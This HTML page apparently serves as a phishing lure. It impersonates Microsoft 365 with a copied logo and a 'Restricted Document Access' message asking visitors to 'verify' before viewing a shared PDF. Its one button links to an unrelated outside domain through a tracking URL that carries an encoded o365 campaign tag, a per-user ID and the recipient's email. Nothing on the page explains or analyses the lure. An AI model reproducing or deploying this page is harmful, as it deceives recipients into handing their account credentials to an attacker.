<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MagnaWave Document Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f3f4f6;
      color: #333;
      padding: 40px 20px;
      position: relative;
    }

    .logo-top-right {
      position: absolute;
      top: 20px;
      right: 90px;
      display: flex;
      align-items: center;
      white-space: nowrap;
    }

    .logo-top-right img {
      max-width: 40px;
      margin-right: 8px;
    }

    .logo-text {
      font-size: 20px;
      color: #666;
      font-weight: 600;
    }

    .content-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 100px;
      text-align: center;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 30px;
    }

    .pdf-container {
      background-color: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    .pdf-image {
      width: 80px;
      margin-bottom: 20px;
    }

    .view-button {
      display: inline-block;
      background-color: #0078D4;
      color: #fff;
      padding: 12px 24px;
      border-radius: 6px;
      text-decoration: none;
      font-weight: 600;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }

    .view-button:hover {
      background-color: #005ea2;
    }

    .view-button::before {
      content: "ðŸ”’ ";
    }

    @media (max-width: 480px) {
      .pdf-container {
        padding: 20px;
      }

      .view-button {
        width: 100%;
      }

      .logo-top-right {
        right: 20px;
      }

      .logo-text {
        font-size: 18px;
      }
    }
  </style>
</head>
<body>

  <!-- Microsoft 365 logo -->
  <div class="logo-top-right">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
    <div class="logo-text">Microsoft 365</div>
  </div>

  <!-- Centered Content -->
  <div class="content-wrapper">
    <h1>Restricted Document Access</h1>
    <div class="subtitle">Please verify to view the document</div>

    <div class="pdf-container">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF Document Icon" class="pdf-image" />
      <br />
      <a href="https://innovativevisionsit.com/n/?c3Y9bzM2NV8xX25vbSZyYW5kPWVGSTNjVUU9JnVpZD1VU0VSMDMwNDIwMjVVNDcwNDAzMDU=N0123N[EMAIL]" class="view-button" target="_blank">VIEW FILE SHARED</a>
    </div>
  </div>

</body>
</html>
